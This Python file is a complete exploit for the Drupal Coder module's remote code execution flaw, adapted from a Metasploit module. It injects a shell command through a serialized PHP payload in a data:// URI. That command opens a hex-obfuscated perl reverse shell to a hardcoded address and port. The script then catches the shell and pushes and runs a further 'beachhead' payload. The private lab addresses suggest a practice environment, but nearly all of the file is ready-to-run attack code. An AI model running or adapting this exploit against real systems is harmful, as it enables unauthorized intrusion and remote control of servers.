from base64 import b64encode
import requests
import threading
import socket
import time


class DrupalCoderExec:
    """Exploit Drupal Coder module to execute arbitrary code on the server"""

    # This is a basic bash reverse shell coded into hex and expanded by the perl pack command
    REV_SHELL = "perl -e 'system(pack(qq,H138,,qq,62617368202D632027303C2632342D3B657865632032343C3E2F6465762F7463702F31302E302E322E31382F35333631363B7368203C263234203E26323420323E26323427,))'\n"

    WEBSERVER_PATH = '/sites/all/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php'

    def __init__(self, beachhead: str):
        """Initialize the exploit with the beachhead payload
        """
        
        self.beachhead = beachhead
        print("DRUPAL: exploit instantiated")

    def create_payload(self, payload: str) -> str:
        """Create the initial exploit payload to be sent to the server

        This is an implementation of the Drupal Coder Exec module from the Metasploit Framework:
        https://www.rapid7.com/db/modules/exploit/unix/webapp/drupal_coder_exec/

        The payload utilizes a poorly sanitized shell_exec call in the coder_upgrade module

        The original shell_exec call does not lend itself to a bind shell such as the one required
        for the beachhead, so first a reverse shell is created during this function.  The reverse shell
        will be caught and used to upload the actual beachhead in a later function.
        """

        p = ''
        p += 'a:6:{s:5:"paths";a:3:{s:12:"modules_base";s:8:"../../..";'
        p += 's:10:"files_base";s:5:"../..";s:14:"libraries_base";s:5:"../..";}'
        p += 's:11:"theme_cache";s:16:"theme_cache_test";'
        p += 's:9:"variables";s:14:"variables_test";'
        p += 's:8:"upgrades";a:1:{i:0;a:2:{s:4:"path";s:2:"..";s:6:"module";s:3:"foo";}}'
        p += 's:10:"extensions";a:1:{s:3:"php";s:3:"php";}'
        p += 's:5:"items";a:1:{i:0;a:3:{s:7:"old_dir";s:12:"../../images";'
        p += 's:7:"new_dir";s:'
        p += str(len(payload) + 5)
        p += ':"-v;'
        p += payload
        p += ' #";s:4:"name";s:4:"test";}}}'

        pl = "data://text/plain;base64," + b64encode(bytes(p, 'utf-8')).decode('utf-8')

        print("DRUPAL: Reverse shell payload created")
        return pl
    
    def send_beachhead(self, payload: str):
        """Send the beachhead to the server
        
        This function will catch the reverse shell created in create_payload and use it to upload
        the beachhead to the server and run it.

        This function is run in a separate thread before the reverse shell is sent to the server.
        Once the reverse shell calls back to this function and is received, the beachhead is sent
        and the thread is closed.
        """
        
        HOST = ''
        PORT = 53616   # Hardcoded for now and reflects the port in the reverse shell
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((HOST, PORT))

        print("DRUPAL: Waiting for reverse shell")
        sock.listen(1)

        conn, addr = sock.accept()
        print("DRUPAL: Shell called home")

        conn.sendall(payload.encode('utf-8'))
        print("DRUPAL: Sent beachhead")

        sock.close()

    def exploit(self, ip_addr: str, port: str, path: str) -> requests.models.Response:
        """Exploit the Drupal Coder module to execute arbitrary code on the server

        This function will send the initial payload to the server, which will create a reverse shell
        and call back to the server.  The reverse shell will then be used to upload the beachhead
        to the server and run it.
        """

        thread = threading.Thread(target=self.send_beachhead, args=(self.beachhead,))
        thread.start()
        print("DRUPAL: Thread started")
        time.sleep(1)
        print("DRUPAL: Sleep over")
        
        url = "http://" + ip_addr + ":" + port + path + self.WEBSERVER_PATH
        params = { 'file': self.create_payload(self.REV_SHELL) }
        print("DRUPAL: Sending reverse shell")
        requests.get(url=url, params=params)

        print("DRUPAL: Reverse shell sent")
        thread.join()
        print("DRUPAL: Thread joined")
        return


if __name__ == "__main__":
    with open ('Drupal_TEST.sh', 'r') as f:
        payload = f.read()
    coder_exec = DrupalCoderExec(payload)
    coder_exec.exploit('10.0.2.46', '80', '/drupal')